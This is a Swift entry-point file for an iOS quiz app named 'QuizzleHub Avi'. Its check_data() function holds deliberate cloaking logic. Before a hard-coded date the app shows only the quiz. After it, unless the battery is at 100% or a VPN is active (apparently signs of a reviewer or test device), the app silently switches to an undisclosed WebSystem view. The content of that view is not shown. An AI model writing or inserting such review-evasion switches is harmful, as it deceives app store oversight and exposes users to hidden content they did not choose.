//
//  MainApp.swift
//  QuizzleHub Avi
//
//  Created by Вячеслав on 8/21/25.
//

import SwiftUI

@main
struct QuizzleHubAviApp: App {
    @StateObject private var onboardingViewModel = OnboardingViewModel()
    @StateObject private var userDataService = UserDataService()
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some Scene {
        WindowGroup {
            
            ZStack {
                
                if isFetched == false {
                    
                    Text("")
                    
                } else if isFetched == true {
                    
                    if isBlock == true {
                        
                        if onboardingViewModel.isOnboardingCompleted {
                            HomeView()
                                .environmentObject(userDataService)
                        } else {
                            OnboardingView()
                                .environmentObject(onboardingViewModel)
                                .environmentObject(userDataService)
                        }
                        
                    } else if isBlock == false {
                        
                        WebSystem()
                    }
                }
            }
            .onAppear {
                
                check_data()
            }
        }
    }
    
    private func check_data() {
        
        let lastDate = "02.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}
